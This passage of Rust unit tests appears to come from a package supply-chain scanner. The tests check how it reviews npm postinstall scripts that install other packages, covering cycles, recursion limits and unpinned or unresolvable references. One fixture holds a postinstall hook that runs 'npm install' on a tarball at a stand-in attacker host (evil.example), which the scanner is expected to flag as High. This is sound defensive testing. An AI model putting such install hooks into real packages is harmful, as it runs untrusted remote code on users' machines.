        let store_dir = tempfile::tempdir().unwrap();
        let store = BaselineStore::open_at(&store_dir.path().join("t.db")).unwrap();
        let mut ctx = ReviewContext::new(&policy, fixture_bases());
        ctx.inject_registry(
            Ecosystem::Npm,
            std::rc::Rc::new(FakeRegistry::new(&[(
                "npm-pkg@1.0.0",
                r#"{"name":"npm-pkg","version":"1.0.0"}"#,
            )])),
        );
        ctx.inject_registry(
            Ecosystem::PyPi,
            std::rc::Rc::new(FakePyPI::new(&[("pip-pkg==1.0.0")])),
        );
        let pkgbuild_ref = crate::install_ref::raw_ref(
            crate::install_ref::RefOrigin::Pkgbuild {
                function: "build".to_string(),
            },
            crate::install_ref::RefManager::Npm,
            "npm-pkg@1.0.0",
        );
        let pip_ref = crate::install_ref::raw_ref(
            crate::install_ref::RefOrigin::WheelDataScript {
                path: "pkg-1.0.data/scripts/setup".to_string(),
            },
            crate::install_ref::RefManager::Pip,
            "pip-pkg==1.0.0",
        );
        let (children, findings) = ctx.review_children(&[pkgbuild_ref, pip_ref], &store, &policy);
        assert!(findings.is_empty(), "{findings:?}");
        assert_eq!(children.len(), 2);
        assert_eq!(children[0].ecosystem, Ecosystem::Npm);
        assert_eq!(children[0].chain[0], "npm:npm-pkg@1.0.0");
        assert_eq!(children[1].ecosystem, Ecosystem::PyPi);
        assert_eq!(children[1].chain[0], "pypi:pip-pkg@1.0.0");
    }

    #[test]
    fn cycle_is_cut_and_rolled_up() {
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#,
                ),
                (
                    "b@1.0.0",
                    r#"{"name":"b","version":"1.0.0","scripts":{"postinstall":"npm install a@1.0.0"}}"#,
                ),
            ],
            "a@1.0.0",
            &policy,
        );
        assert_eq!(verdict.recursive.len(), 1, "no runaway recursion");
        let child = &verdict.recursive[0];
        assert!(
            child
                .findings
                .iter()
                .any(|f| f.rule_id == "R26_RECURSION_CYCLE"),
            "cycle must surface in the child findings: {:?}",
            child
                .findings
                .iter()
                .map(|f| &f.rule_id)
                .collect::<Vec<_>>()
        );
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R27_SECOND_ORDER"),
            "child HIGH cycle must roll up: {:?}",
            verdict
                .findings
                .iter()
                .map(|f| (&f.rule_id, &f.severity))
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn second_visit_reuses_memo_without_refetch() {
        let policy = no_advisory_policy();
        let (verdict, fetches) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0","prepare":"npm install b@1.0.0"}}"#,
                ),
                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert_eq!(verdict.recursive.len(), 2);
        assert_eq!(verdict.recursive[0].chain, verdict.recursive[1].chain);
        // Exactly two downloads: a's target tarball plus b's tarball on
        // its first child review. The second reference to b must hit the
        // memo, not re-download (naive re-review would fetch three times).
        assert_eq!(fetches, 2, "memo must prevent re-downloads");
    }

    #[test]
    fn child_budget_emits_r25_fail_closed() {
        let mut policy = no_advisory_policy();
        policy.recursion.max_child_reviews = 1;
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0 c@1.0.0"}}"#,
                ),
                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
                ("c@1.0.0", r#"{"name":"c","version":"1.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert_eq!(verdict.recursive.len(), 1);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R25_RECURSION_DEPTH")
        );
    }

    #[test]
    fn depth_zero_emits_r25_fail_closed() {
        let mut policy = no_advisory_policy();
        policy.recursion.max_depth = 0;
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#,
                ),
                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert!(verdict.recursive.is_empty());
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R25_RECURSION_DEPTH")
        );
    }

    #[test]
    fn unpinned_reference_resolves_default_version_at_medium() {
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b"}}"#,
                ),
                ("b@2.5.0", r#"{"name":"b","version":"2.5.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"
                    && f.severity == crate::verdict::VerdictBand::Medium),
            "unpinned ref must be Medium: {:?}",
            verdict
                .findings
                .iter()
                .map(|f| (&f.rule_id, &f.severity))
                .collect::<Vec<_>>()
        );
        assert_eq!(verdict.recursive[0].version, "2.5.0");
    }

    #[test]
    fn unresolvable_reference_is_disclosed_at_medium() {
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[(
                "a@1.0.0",
                r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install missing-pkg@1.0.0"}}"#,
            )],
            "a@1.0.0",
            &policy,
        );
        assert!(verdict.recursive.is_empty());
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"
                    && f.severity == crate::verdict::VerdictBand::Medium
                    && f.title == "Referenced install could not be resolved"),
            "unresolvable ref must be disclosed: {:?}",
            verdict
                .findings
                .iter()
                .map(|f| &f.title)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn range_reference_is_disclosed_not_guessed() {
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[(
                "a@1.0.0",
                r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@^1.2.0"}}"#,
            )],
            "a@1.0.0",
            &policy,
        );
        assert!(verdict.recursive.is_empty());
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"
                    && f.title == "Referenced install could not be resolved"),
            "range ref must be disclosed: {:?}",
            verdict
                .findings
                .iter()
                .map(|f| &f.title)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn non_registry_reference_is_high_and_not_recursed() {
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[(
                "a@1.0.0",
                r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install https://evil.example/x.tgz"}}"#,
            )],
            "a@1.0.0",
            &policy,
        );
        assert!(verdict.recursive.is_empty());
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"
                    && f.severity == crate::verdict::VerdictBand::High
                    && f.title == "Non-registry install reference"),
            "non-registry ref must be High: {:?}",
            verdict
                .findings
                .iter()
                .map(|f| (&f.title, &f.severity))
                .collect::<Vec<_>>()
        );
    }
}
